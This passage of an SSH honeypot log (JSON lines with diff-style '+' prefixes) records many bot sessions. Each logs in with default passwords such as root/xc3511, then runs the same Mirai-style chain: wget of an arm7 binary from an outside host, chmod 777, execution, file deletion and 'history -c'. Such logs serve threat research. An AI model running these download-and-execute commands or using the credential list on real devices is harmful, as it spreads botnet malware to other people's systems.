+{"event": "command", "ts": "2026-10-18T17:13:42.946331+00:00", "session_id": "499b191f", "src_ip": "192.0.2.14", "command": "chmod 777 .x", "seconds_since_prev": 0.0522, "backspaces": 0}
+{"event": "command", "ts": "2026-10-18T17:13:43.013325+00:00", "session_id": "499b191f", "src_ip": "192.0.2.14", "command": "./.x ssh", "seconds_since_prev": 0.067, "backspaces": 0}
+{"event": "command", "ts": "2026-10-18T17:13:43.099992+00:00", "session_id": "499b191f", "src_ip": "192.0.2.14", "command": "rm -rf .x", "seconds_since_prev": 0.0867, "backspaces": 0}
+{"event": "command", "ts": "2026-10-18T17:13:43.182249+00:00", "session_id": "499b191f", "src_ip": "192.0.2.14", "command": "history -c", "seconds_since_prev": 0.0823, "backspaces": 0}
+{"event": "session_end", "ts": "2026-10-18T17:13:44.158361+00:00", "session_id": "499b191f", "src_ip": "192.0.2.14", "duration_s": 1.675, "command_count": 8, "auth_attempts": 1, "reason": "closed"}
+{"event": "session_start", "ts": "2026-10-18T13:44:42.483536+00:00", "session_id": "640060c4", "src_ip": "192.0.2.103", "src_port": 57153, "client_banner": "SSH-2.0-libssh2_1.9.0"}
+{"event": "auth_attempt", "ts": "2026-10-18T13:44:42.638322+00:00", "session_id": "640060c4", "src_ip": "192.0.2.103", "username": "root", "password": "root", "accepted": true}
+{"event": "command", "ts": "2026-10-18T13:44:42.696901+00:00", "session_id": "640060c4", "src_ip": "192.0.2.103", "command": "/bin/busybox ECCHI", "seconds_since_prev": 0.0, "backspaces": 0}
+{"event": "command", "ts": "2026-10-18T13:44:42.775268+00:00", "session_id": "640060c4", "src_ip": "192.0.2.103", "command": "cat /proc/cpuinfo", "seconds_since_prev": 0.0784, "backspaces": 0}
+{"event": "command", "ts": "2026-10-18T13:44:42.831389+00:00", "session_id": "640060c4", "src_ip": "192.0.2.103", "command": "cd /tmp || cd /var/run || cd /mnt", "seconds_since_prev": 0.0561, "backspaces": 0}
+{"event": "command", "ts": "2026-10-18T13:44:42.909193+00:00", "session_id": "640060c4", "src_ip": "192.0.2.103", "command": "wget http://192.0.2.250/bins/arm7 -O .x", "seconds_since_prev": 0.0778, "backspaces": 0}
+{"event": "command", "ts": "2026-10-18T13:44:42.952022+00:00", "session_id": "640060c4", "src_ip": "192.0.2.103", "command": "chmod 777 .x", "seconds_since_prev": 0.0428, "backspaces": 0}
+{"event": "command", "ts": "2026-10-18T13:44:43.029995+00:00", "session_id": "640060c4", "src_ip": "192.0.2.103", "command": "./.x ssh", "seconds_since_prev": 0.078, "backspaces": 0}
+{"event": "command", "ts": "2026-10-18T13:44:43.072675+00:00", "session_id": "640060c4", "src_ip": "192.0.2.103", "command": "rm -rf .x", "seconds_since_prev": 0.0427, "backspaces": 0}
+{"event": "command", "ts": "2026-10-18T13:44:43.150767+00:00", "session_id": "640060c4", "src_ip": "192.0.2.103", "command": "history -c", "seconds_since_prev": 0.0781, "backspaces": 0}
+{"event": "session_end", "ts": "2026-10-18T13:44:43.971580+00:00", "session_id": "640060c4", "src_ip": "192.0.2.103", "duration_s": 1.488, "command_count": 8, "auth_attempts": 1, "reason": "closed"}
+{"event": "session_start", "ts": "2026-10-20T11:34:42.483536+00:00", "session_id": "23c29969", "src_ip": "198.51.100.22", "src_port": 62554, "client_banner": "SSH-2.0-libssh2_1.9.0"}
+{"event": "auth_attempt", "ts": "2026-10-20T11:34:42.872151+00:00", "session_id": "23c29969", "src_ip": "198.51.100.22", "username": "root", "password": "root", "accepted": true}
+{"event": "command", "ts": "2026-10-20T11:34:42.954821+00:00", "session_id": "23c29969", "src_ip": "198.51.100.22", "command": "/bin/busybox ECCHI", "seconds_since_prev": 0.0, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T11:34:43.004297+00:00", "session_id": "23c29969", "src_ip": "198.51.100.22", "command": "cat /proc/cpuinfo", "seconds_since_prev": 0.0495, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T11:34:43.065550+00:00", "session_id": "23c29969", "src_ip": "198.51.100.22", "command": "cd /tmp || cd /var/run || cd /mnt", "seconds_since_prev": 0.0613, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T11:34:43.109957+00:00", "session_id": "23c29969", "src_ip": "198.51.100.22", "command": "wget http://192.0.2.250/bins/arm7 -O .x", "seconds_since_prev": 0.0444, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T11:34:43.177491+00:00", "session_id": "23c29969", "src_ip": "198.51.100.22", "command": "chmod 777 .x", "seconds_since_prev": 0.0675, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T11:34:43.243640+00:00", "session_id": "23c29969", "src_ip": "198.51.100.22", "command": "./.x ssh", "seconds_since_prev": 0.0661, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T11:34:43.324047+00:00", "session_id": "23c29969", "src_ip": "198.51.100.22", "command": "rm -rf .x", "seconds_since_prev": 0.0804, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T11:34:43.384942+00:00", "session_id": "23c29969", "src_ip": "198.51.100.22", "command": "history -c", "seconds_since_prev": 0.0609, "backspaces": 0}
+{"event": "session_end", "ts": "2026-10-20T11:34:44.281420+00:00", "session_id": "23c29969", "src_ip": "198.51.100.22", "duration_s": 1.798, "command_count": 8, "auth_attempts": 1, "reason": "closed"}
+{"event": "session_start", "ts": "2026-10-21T15:23:42.483536+00:00", "session_id": "9c70859d", "src_ip": "198.51.100.91", "src_port": 31335, "client_banner": "SSH-2.0-libssh2_1.9.0"}
+{"event": "auth_attempt", "ts": "2026-10-21T15:23:42.682334+00:00", "session_id": "9c70859d", "src_ip": "198.51.100.91", "username": "support", "password": "support", "accepted": true}
+{"event": "command", "ts": "2026-10-21T15:23:42.769843+00:00", "session_id": "9c70859d", "src_ip": "198.51.100.91", "command": "/bin/busybox ECCHI", "seconds_since_prev": 0.0, "backspaces": 0}
+{"event": "command", "ts": "2026-10-21T15:23:42.837177+00:00", "session_id": "9c70859d", "src_ip": "198.51.100.91", "command": "cat /proc/cpuinfo", "seconds_since_prev": 0.0673, "backspaces": 0}
+{"event": "command", "ts": "2026-10-21T15:23:42.892450+00:00", "session_id": "9c70859d", "src_ip": "198.51.100.91", "command": "cd /tmp || cd /var/run || cd /mnt", "seconds_since_prev": 0.0553, "backspaces": 0}
+{"event": "command", "ts": "2026-10-21T15:23:42.968143+00:00", "session_id": "9c70859d", "src_ip": "198.51.100.91", "command": "wget http://192.0.2.250/bins/arm7 -O .x", "seconds_since_prev": 0.0757, "backspaces": 0}
+{"event": "command", "ts": "2026-10-21T15:23:43.039786+00:00", "session_id": "9c70859d", "src_ip": "198.51.100.91", "command": "chmod 777 .x", "seconds_since_prev": 0.0716, "backspaces": 0}
+{"event": "command", "ts": "2026-10-21T15:23:43.093862+00:00", "session_id": "9c70859d", "src_ip": "198.51.100.91", "command": "./.x ssh", "seconds_since_prev": 0.0541, "backspaces": 0}
+{"event": "command", "ts": "2026-10-21T15:23:43.183701+00:00", "session_id": "9c70859d", "src_ip": "198.51.100.91", "command": "rm -rf .x", "seconds_since_prev": 0.0898, "backspaces": 0}
+{"event": "command", "ts": "2026-10-21T15:23:43.267568+00:00", "session_id": "9c70859d", "src_ip": "198.51.100.91", "command": "history -c", "seconds_since_prev": 0.0839, "backspaces": 0}
+{"event": "session_end", "ts": "2026-10-21T15:23:43.697677+00:00", "session_id": "9c70859d", "src_ip": "198.51.100.91", "duration_s": 1.214, "command_count": 8, "auth_attempts": 1, "reason": "closed"}
+{"event": "session_start", "ts": "2026-10-17T14:58:42.483536+00:00", "session_id": "93dae221", "src_ip": "192.0.2.103", "src_port": 44161, "client_banner": "SSH-2.0-Go"}
+{"event": "auth_attempt", "ts": "2026-10-17T14:58:42.569758+00:00", "session_id": "93dae221", "src_ip": "192.0.2.103", "username": "root", "password": "xc3511", "accepted": true}
+{"event": "command", "ts": "2026-10-17T14:58:42.636684+00:00", "session_id": "93dae221", "src_ip": "192.0.2.103", "command": "/bin/busybox ECCHI", "seconds_since_prev": 0.0, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T14:58:42.711524+00:00", "session_id": "93dae221", "src_ip": "192.0.2.103", "command": "cat /proc/cpuinfo", "seconds_since_prev": 0.0748, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T14:58:42.754620+00:00", "session_id": "93dae221", "src_ip": "192.0.2.103", "command": "cd /tmp || cd /var/run || cd /mnt", "seconds_since_prev": 0.0431, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T14:58:42.829089+00:00", "session_id": "93dae221", "src_ip": "192.0.2.103", "command": "wget http://192.0.2.250/bins/arm7 -O .x", "seconds_since_prev": 0.0745, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T14:58:42.889004+00:00", "session_id": "93dae221", "src_ip": "192.0.2.103", "command": "chmod 777 .x", "seconds_since_prev": 0.0599, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T14:58:42.930925+00:00", "session_id": "93dae221", "src_ip": "192.0.2.103", "command": "./.x ssh", "seconds_since_prev": 0.0419, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T14:58:42.990875+00:00", "session_id": "93dae221", "src_ip": "192.0.2.103", "command": "rm -rf .x", "seconds_since_prev": 0.0599, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T14:58:43.079890+00:00", "session_id": "93dae221", "src_ip": "192.0.2.103", "command": "history -c", "seconds_since_prev": 0.089, "backspaces": 0}
+{"event": "session_end", "ts": "2026-10-17T14:58:43.216684+00:00", "session_id": "93dae221", "src_ip": "192.0.2.103", "duration_s": 0.733, "command_count": 8, "auth_attempts": 1, "reason": "closed"}
+{"event": "session_start", "ts": "2026-10-20T11:55:42.483536+00:00", "session_id": "453839e0", "src_ip": "198.51.100.22", "src_port": 64319, "client_banner": "SSH-2.0-libssh2_1.9.0"}
+{"event": "auth_attempt", "ts": "2026-10-20T11:55:42.748685+00:00", "session_id": "453839e0", "src_ip": "198.51.100.22", "username": "root", "password": "xc3511", "accepted": true}
+{"event": "command", "ts": "2026-10-20T11:55:42.816760+00:00", "session_id": "453839e0", "src_ip": "198.51.100.22", "command": "/bin/busybox ECCHI", "seconds_since_prev": 0.0, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T11:55:42.904582+00:00", "session_id": "453839e0", "src_ip": "198.51.100.22", "command": "cat /proc/cpuinfo", "seconds_since_prev": 0.0878, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T11:55:42.949057+00:00", "session_id": "453839e0", "src_ip": "198.51.100.22", "command": "cd /tmp || cd /var/run || cd /mnt", "seconds_since_prev": 0.0445, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T11:55:43.038178+00:00", "session_id": "453839e0", "src_ip": "198.51.100.22", "command": "wget http://192.0.2.250/bins/arm7 -O .x", "seconds_since_prev": 0.0891, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T11:55:43.111855+00:00", "session_id": "453839e0", "src_ip": "198.51.100.22", "command": "chmod 777 .x", "seconds_since_prev": 0.0737, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T11:55:43.190445+00:00", "session_id": "453839e0", "src_ip": "198.51.100.22", "command": "./.x ssh", "seconds_since_prev": 0.0786, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T11:55:43.267719+00:00", "session_id": "453839e0", "src_ip": "198.51.100.22", "command": "rm -rf .x", "seconds_since_prev": 0.0773, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T11:55:43.309334+00:00", "session_id": "453839e0", "src_ip": "198.51.100.22", "command": "history -c", "seconds_since_prev": 0.0416, "backspaces": 0}
+{"event": "session_end", "ts": "2026-10-20T11:55:43.540870+00:00", "session_id": "453839e0", "src_ip": "198.51.100.22", "duration_s": 1.057, "command_count": 8, "auth_attempts": 1, "reason": "closed"}
+{"event": "session_start", "ts": "2026-10-17T11:19:42.483536+00:00", "session_id": "ccaee1ef", "src_ip": "192.0.2.57", "src_port": 55324, "client_banner": "SSH-2.0-libssh2_1.9.0"}
+{"event": "auth_attempt", "ts": "2026-10-17T11:19:42.703041+00:00", "session_id": "ccaee1ef", "src_ip": "192.0.2.57", "username": "root", "password": "vizxv", "accepted": true}
+{"event": "command", "ts": "2026-10-17T11:19:42.746544+00:00", "session_id": "ccaee1ef", "src_ip": "192.0.2.57", "command": "/bin/busybox ECCHI", "seconds_since_prev": 0.0, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T11:19:42.817461+00:00", "session_id": "ccaee1ef", "src_ip": "192.0.2.57", "command": "cat /proc/cpuinfo", "seconds_since_prev": 0.0709, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T11:19:42.865636+00:00", "session_id": "ccaee1ef", "src_ip": "192.0.2.57", "command": "cd /tmp || cd /var/run || cd /mnt", "seconds_since_prev": 0.0482, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T11:19:42.935640+00:00", "session_id": "ccaee1ef", "src_ip": "192.0.2.57", "command": "wget http://192.0.2.250/bins/arm7 -O .x", "seconds_since_prev": 0.07, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T11:19:42.999256+00:00", "session_id": "ccaee1ef", "src_ip": "192.0.2.57", "command": "chmod 777 .x", "seconds_since_prev": 0.0636, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T11:19:43.079474+00:00", "session_id": "ccaee1ef", "src_ip": "192.0.2.57", "command": "./.x ssh", "seconds_since_prev": 0.0802, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T11:19:43.159577+00:00", "session_id": "ccaee1ef", "src_ip": "192.0.2.57", "command": "rm -rf .x", "seconds_since_prev": 0.0801, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T11:19:43.233288+00:00", "session_id": "ccaee1ef", "src_ip": "192.0.2.57", "command": "history -c", "seconds_since_prev": 0.0737, "backspaces": 0}
+{"event": "session_end", "ts": "2026-10-17T11:19:43.586183+00:00", "session_id": "ccaee1ef", "src_ip": "192.0.2.57", "duration_s": 1.103, "command_count": 8, "auth_attempts": 1, "reason": "closed"}
+{"event": "session_start", "ts": "2026-10-17T16:55:42.483536+00:00", "session_id": "4aac68ef", "src_ip": "192.0.2.14", "src_port": 40689, "client_banner": "SSH-2.0-libssh2_1.9.0"}
+{"event": "auth_attempt", "ts": "2026-10-17T16:55:42.586698+00:00", "session_id": "4aac68ef", "src_ip": "192.0.2.14", "username": "root", "password": "123456", "accepted": true}
+{"event": "command", "ts": "2026-10-17T16:55:42.659732+00:00", "session_id": "4aac68ef", "src_ip": "192.0.2.14", "command": "/bin/busybox ECCHI", "seconds_since_prev": 0.0, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T16:55:42.702512+00:00", "session_id": "4aac68ef", "src_ip": "192.0.2.14", "command": "cat /proc/cpuinfo", "seconds_since_prev": 0.0428, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T16:55:42.781882+00:00", "session_id": "4aac68ef", "src_ip": "192.0.2.14", "command": "cd /tmp || cd /var/run || cd /mnt", "seconds_since_prev": 0.0794, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T16:55:42.828065+00:00", "session_id": "4aac68ef", "src_ip": "192.0.2.14", "command": "wget http://192.0.2.250/bins/arm7 -O .x", "seconds_since_prev": 0.0462, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T16:55:42.878027+00:00", "session_id": "4aac68ef", "src_ip": "192.0.2.14", "command": "chmod 777 .x", "seconds_since_prev": 0.05, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T16:55:42.921174+00:00", "session_id": "4aac68ef", "src_ip": "192.0.2.14", "command": "./.x ssh", "seconds_since_prev": 0.0431, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T16:55:42.986934+00:00", "session_id": "4aac68ef", "src_ip": "192.0.2.14", "command": "rm -rf .x", "seconds_since_prev": 0.0658, "backspaces": 0}
+{"event": "command", "ts": "2026-10-17T16:55:43.058008+00:00", "session_id": "4aac68ef", "src_ip": "192.0.2.14", "command": "history -c", "seconds_since_prev": 0.0711, "backspaces": 0}
+{"event": "session_end", "ts": "2026-10-17T16:55:43.673042+00:00", "session_id": "4aac68ef", "src_ip": "192.0.2.14", "duration_s": 1.19, "command_count": 8, "auth_attempts": 1, "reason": "closed"}
+{"event": "session_start", "ts": "2026-10-19T11:14:42.483536+00:00", "session_id": "a67ee36d", "src_ip": "192.0.2.57", "src_port": 44192, "client_banner": "SSH-2.0-libssh2_1.9.0"}
+{"event": "auth_attempt", "ts": "2026-10-19T11:14:42.863638+00:00", "session_id": "a67ee36d", "src_ip": "192.0.2.57", "username": "root", "password": "xc3511", "accepted": true}
+{"event": "command", "ts": "2026-10-19T11:14:42.930154+00:00", "session_id": "a67ee36d", "src_ip": "192.0.2.57", "command": "/bin/busybox ECCHI", "seconds_since_prev": 0.0, "backspaces": 0}
+{"event": "command", "ts": "2026-10-19T11:14:43.003250+00:00", "session_id": "a67ee36d", "src_ip": "192.0.2.57", "command": "cat /proc/cpuinfo", "seconds_since_prev": 0.0731, "backspaces": 0}
+{"event": "command", "ts": "2026-10-19T11:14:43.046090+00:00", "session_id": "a67ee36d", "src_ip": "192.0.2.57", "command": "cd /tmp || cd /var/run || cd /mnt", "seconds_since_prev": 0.0428, "backspaces": 0}
+{"event": "command", "ts": "2026-10-19T11:14:43.132084+00:00", "session_id": "a67ee36d", "src_ip": "192.0.2.57", "command": "wget http://192.0.2.250/bins/arm7 -O .x", "seconds_since_prev": 0.086, "backspaces": 0}
+{"event": "command", "ts": "2026-10-19T11:14:43.177106+00:00", "session_id": "a67ee36d", "src_ip": "192.0.2.57", "command": "chmod 777 .x", "seconds_since_prev": 0.045, "backspaces": 0}
+{"event": "command", "ts": "2026-10-19T11:14:43.244903+00:00", "session_id": "a67ee36d", "src_ip": "192.0.2.57", "command": "./.x ssh", "seconds_since_prev": 0.0678, "backspaces": 0}
+{"event": "command", "ts": "2026-10-19T11:14:43.299221+00:00", "session_id": "a67ee36d", "src_ip": "192.0.2.57", "command": "rm -rf .x", "seconds_since_prev": 0.0543, "backspaces": 0}
+{"event": "command", "ts": "2026-10-19T11:14:43.382998+00:00", "session_id": "a67ee36d", "src_ip": "192.0.2.57", "command": "history -c", "seconds_since_prev": 0.0838, "backspaces": 0}
+{"event": "session_end", "ts": "2026-10-19T11:14:44.306565+00:00", "session_id": "a67ee36d", "src_ip": "192.0.2.57", "duration_s": 1.823, "command_count": 8, "auth_attempts": 1, "reason": "closed"}
+{"event": "session_start", "ts": "2026-10-18T11:29:42.483536+00:00", "session_id": "9d521a0a", "src_ip": "192.0.2.103", "src_port": 47616, "client_banner": "SSH-2.0-Go"}
+{"event": "auth_attempt", "ts": "2026-10-18T11:29:42.721123+00:00", "session_id": "9d521a0a", "src_ip": "192.0.2.103", "username": "root", "password": "admin", "accepted": true}
+{"event": "command", "ts": "2026-10-18T11:29:42.762850+00:00", "session_id": "9d521a0a", "src_ip": "192.0.2.103", "command": "/bin/busybox ECCHI", "seconds_since_prev": 0.0, "backspaces": 0}
+{"event": "command", "ts": "2026-10-18T11:29:42.818980+00:00", "session_id": "9d521a0a", "src_ip": "192.0.2.103", "command": "cat /proc/cpuinfo", "seconds_since_prev": 0.0561, "backspaces": 0}
+{"event": "command", "ts": "2026-10-18T11:29:42.900623+00:00", "session_id": "9d521a0a", "src_ip": "192.0.2.103", "command": "cd /tmp || cd /var/run || cd /mnt", "seconds_since_prev": 0.0816, "backspaces": 0}
+{"event": "command", "ts": "2026-10-18T11:29:42.987370+00:00", "session_id": "9d521a0a", "src_ip": "192.0.2.103", "command": "wget http://192.0.2.250/bins/arm7 -O .x", "seconds_since_prev": 0.0867, "backspaces": 0}
+{"event": "command", "ts": "2026-10-18T11:29:43.048781+00:00", "session_id": "9d521a0a", "src_ip": "192.0.2.103", "command": "chmod 777 .x", "seconds_since_prev": 0.0614, "backspaces": 0}
+{"event": "command", "ts": "2026-10-18T11:29:43.133109+00:00", "session_id": "9d521a0a", "src_ip": "192.0.2.103", "command": "./.x ssh", "seconds_since_prev": 0.0843, "backspaces": 0}
+{"event": "command", "ts": "2026-10-18T11:29:43.205280+00:00", "session_id": "9d521a0a", "src_ip": "192.0.2.103", "command": "rm -rf .x", "seconds_since_prev": 0.0722, "backspaces": 0}
+{"event": "command", "ts": "2026-10-18T11:29:43.273626+00:00", "session_id": "9d521a0a", "src_ip": "192.0.2.103", "command": "history -c", "seconds_since_prev": 0.0683, "backspaces": 0}
+{"event": "session_end", "ts": "2026-10-18T11:29:43.525943+00:00", "session_id": "9d521a0a", "src_ip": "192.0.2.103", "duration_s": 1.042, "command_count": 8, "auth_attempts": 1, "reason": "closed"}
+{"event": "session_start", "ts": "2026-10-19T13:51:42.483536+00:00", "session_id": "a5a6ebac", "src_ip": "192.0.2.14", "src_port": 42425, "client_banner": "SSH-2.0-libssh-0.9.6"}
+{"event": "auth_attempt", "ts": "2026-10-19T13:51:42.840719+00:00", "session_id": "a5a6ebac", "src_ip": "192.0.2.14", "username": "root", "password": "admin", "accepted": true}
+{"event": "command", "ts": "2026-10-19T13:51:42.907520+00:00", "session_id": "a5a6ebac", "src_ip": "192.0.2.14", "command": "/bin/busybox ECCHI", "seconds_since_prev": 0.0, "backspaces": 0}
+{"event": "command", "ts": "2026-10-19T13:51:42.984362+00:00", "session_id": "a5a6ebac", "src_ip": "192.0.2.14", "command": "cat /proc/cpuinfo", "seconds_since_prev": 0.0768, "backspaces": 0}
+{"event": "command", "ts": "2026-10-19T13:51:43.034748+00:00", "session_id": "a5a6ebac", "src_ip": "192.0.2.14", "command": "cd /tmp || cd /var/run || cd /mnt", "seconds_since_prev": 0.0504, "backspaces": 0}
+{"event": "command", "ts": "2026-10-19T13:51:43.100996+00:00", "session_id": "a5a6ebac", "src_ip": "192.0.2.14", "command": "wget http://192.0.2.250/bins/arm7 -O .x", "seconds_since_prev": 0.0662, "backspaces": 0}
+{"event": "command", "ts": "2026-10-19T13:51:43.174809+00:00", "session_id": "a5a6ebac", "src_ip": "192.0.2.14", "command": "chmod 777 .x", "seconds_since_prev": 0.0738, "backspaces": 0}
+{"event": "command", "ts": "2026-10-19T13:51:43.245752+00:00", "session_id": "a5a6ebac", "src_ip": "192.0.2.14", "command": "./.x ssh", "seconds_since_prev": 0.0709, "backspaces": 0}
+{"event": "command", "ts": "2026-10-19T13:51:43.313885+00:00", "session_id": "a5a6ebac", "src_ip": "192.0.2.14", "command": "rm -rf .x", "seconds_since_prev": 0.0681, "backspaces": 0}
+{"event": "command", "ts": "2026-10-19T13:51:43.403484+00:00", "session_id": "a5a6ebac", "src_ip": "192.0.2.14", "command": "history -c", "seconds_since_prev": 0.0896, "backspaces": 0}
+{"event": "session_end", "ts": "2026-10-19T13:51:44.036297+00:00", "session_id": "a5a6ebac", "src_ip": "192.0.2.14", "duration_s": 1.553, "command_count": 8, "auth_attempts": 1, "reason": "closed"}
+{"event": "session_start", "ts": "2026-10-19T11:56:42.483536+00:00", "session_id": "2e0ac957", "src_ip": "198.51.100.22", "src_port": 47142, "client_banner": "SSH-2.0-libssh2_1.9.0"}
+{"event": "auth_attempt", "ts": "2026-10-19T11:56:42.649294+00:00", "session_id": "2e0ac957", "src_ip": "198.51.100.22", "username": "root", "password": "admin", "accepted": true}
+{"event": "command", "ts": "2026-10-19T11:56:42.701876+00:00", "session_id": "2e0ac957", "src_ip": "198.51.100.22", "command": "/bin/busybox ECCHI", "seconds_since_prev": 0.0, "backspaces": 0}
+{"event": "command", "ts": "2026-10-19T11:56:42.770264+00:00", "session_id": "2e0ac957", "src_ip": "198.51.100.22", "command": "cat /proc/cpuinfo", "seconds_since_prev": 0.0684, "backspaces": 0}
+{"event": "command", "ts": "2026-10-19T11:56:42.845876+00:00", "session_id": "2e0ac957", "src_ip": "198.51.100.22", "command": "cd /tmp || cd /var/run || cd /mnt", "seconds_since_prev": 0.0756, "backspaces": 0}
+{"event": "command", "ts": "2026-10-19T11:56:42.898400+00:00", "session_id": "2e0ac957", "src_ip": "198.51.100.22", "command": "wget http://192.0.2.250/bins/arm7 -O .x", "seconds_since_prev": 0.0525, "backspaces": 0}
+{"event": "command", "ts": "2026-10-19T11:56:42.943420+00:00", "session_id": "2e0ac957", "src_ip": "198.51.100.22", "command": "chmod 777 .x", "seconds_since_prev": 0.045, "backspaces": 0}
+{"event": "command", "ts": "2026-10-19T11:56:42.992705+00:00", "session_id": "2e0ac957", "src_ip": "198.51.100.22", "command": "./.x ssh", "seconds_since_prev": 0.0493, "backspaces": 0}
+{"event": "command", "ts": "2026-10-19T11:56:43.050106+00:00", "session_id": "2e0ac957", "src_ip": "198.51.100.22", "command": "rm -rf .x", "seconds_since_prev": 0.0574, "backspaces": 0}
+{"event": "command", "ts": "2026-10-19T11:56:43.110751+00:00", "session_id": "2e0ac957", "src_ip": "198.51.100.22", "command": "history -c", "seconds_since_prev": 0.0606, "backspaces": 0}
+{"event": "session_end", "ts": "2026-10-19T11:56:43.671189+00:00", "session_id": "2e0ac957", "src_ip": "198.51.100.22", "duration_s": 1.188, "command_count": 8, "auth_attempts": 1, "reason": "closed"}
+{"event": "session_start", "ts": "2026-10-20T16:41:42.483536+00:00", "session_id": "459dc981", "src_ip": "198.51.100.22", "src_port": 58435, "client_banner": "SSH-2.0-Go"}
+{"event": "auth_attempt", "ts": "2026-10-20T16:41:42.726408+00:00", "session_id": "459dc981", "src_ip": "198.51.100.22", "username": "root", "password": "xc3511", "accepted": true}
+{"event": "command", "ts": "2026-10-20T16:41:42.805209+00:00", "session_id": "459dc981", "src_ip": "198.51.100.22", "command": "/bin/busybox ECCHI", "seconds_since_prev": 0.0, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T16:41:42.860356+00:00", "session_id": "459dc981", "src_ip": "198.51.100.22", "command": "cat /proc/cpuinfo", "seconds_since_prev": 0.0551, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T16:41:42.919611+00:00", "session_id": "459dc981", "src_ip": "198.51.100.22", "command": "cd /tmp || cd /var/run || cd /mnt", "seconds_since_prev": 0.0593, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T16:41:42.979017+00:00", "session_id": "459dc981", "src_ip": "198.51.100.22", "command": "wget http://192.0.2.250/bins/arm7 -O .x", "seconds_since_prev": 0.0594, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T16:41:43.044691+00:00", "session_id": "459dc981", "src_ip": "198.51.100.22", "command": "chmod 777 .x", "seconds_since_prev": 0.0657, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T16:41:43.123052+00:00", "session_id": "459dc981", "src_ip": "198.51.100.22", "command": "./.x ssh", "seconds_since_prev": 0.0784, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T16:41:43.168169+00:00", "session_id": "459dc981", "src_ip": "198.51.100.22", "command": "rm -rf .x", "seconds_since_prev": 0.0451, "backspaces": 0}
+{"event": "command", "ts": "2026-10-20T16:41:43.254911+00:00", "session_id": "459dc981", "src_ip": "198.51.100.22", "command": "history -c", "seconds_since_prev": 0.0867, "backspaces": 0}
+{"event": "session_end", "ts": "2026-10-20T16:41:43.565877+00:00", "session_id": "459dc981", "src_ip": "198.51.100.22", "duration_s": 1.082, "command_count": 8, "auth_attempts": 1, "reason": "closed"}
+{"event": "session_start", "ts": "2026-10-16T17:53:42.483536+00:00", "session_id": "5ec42186", "src_ip": "192.0.2.14", "src_port": 33631, "client_banner": "SSH-2.0-Go"}
+{"event": "auth_attempt", "ts": "2026-10-16T17:53:42.851170+00:00", "session_id": "5ec42186", "src_ip": "192.0.2.14", "username": "root", "password": "root", "accepted": true}
+{"event": "command", "ts": "2026-10-16T17:53:42.941117+00:00", "session_id": "5ec42186", "src_ip": "192.0.2.14", "command": "/bin/busybox ECCHI", "seconds_since_prev": 0.0, "backspaces": 0}
+{"event": "command", "ts": "2026-10-16T17:53:43.010331+00:00", "session_id": "5ec42186", "src_ip": "192.0.2.14", "command": "cat /proc/cpuinfo", "seconds_since_prev": 0.0692, "backspaces": 0}
+{"event": "command", "ts": "2026-10-16T17:53:43.076438+00:00", "session_id": "5ec42186", "src_ip": "192.0.2.14", "command": "cd /tmp || cd /var/run || cd /mnt", "seconds_since_prev": 0.0661, "backspaces": 0}
+{"event": "command", "ts": "2026-10-16T17:53:43.117769+00:00", "session_id": "5ec42186", "src_ip": "192.0.2.14", "command": "wget http://192.0.2.250/bins/arm7 -O .x", "seconds_since_prev": 0.0413, "backspaces": 0}
+{"event": "command", "ts": "2026-10-16T17:53:43.192527+00:00", "session_id": "5ec42186", "src_ip": "192.0.2.14", "command": "chmod 777 .x", "seconds_since_prev": 0.0748, "backspaces": 0}
+{"event": "command", "ts": "2026-10-16T17:53:43.248407+00:00", "session_id": "5ec42186", "src_ip": "192.0.2.14", "command": "./.x ssh", "seconds_since_prev": 0.0559, "backspaces": 0}
+{"event": "command", "ts": "2026-10-16T17:53:43.296119+00:00", "session_id": "5ec42186", "src_ip": "192.0.2.14", "command": "rm -rf .x", "seconds_since_prev": 0.0477, "backspaces": 0}
+{"event": "command", "ts": "2026-10-16T17:53:43.377228+00:00", "session_id": "5ec42186", "src_ip": "192.0.2.14", "command": "history -c", "seconds_since_prev": 0.0811, "backspaces": 0}
+{"event": "session_end", "ts": "2026-10-16T17:53:43.699680+00:00", "session_id": "5ec42186", "src_ip": "192.0.2.14", "duration_s": 1.216, "command_count": 8, "auth_attempts": 1, "reason": "closed"}
+{"event": "session_start", "ts": "2026-10-19T18:30:42.483536+00:00", "session_id": "2134dc35", "src_ip": "192.0.2.103", "src_port": 52183, "client_banner": "SSH-2.0-Go"}
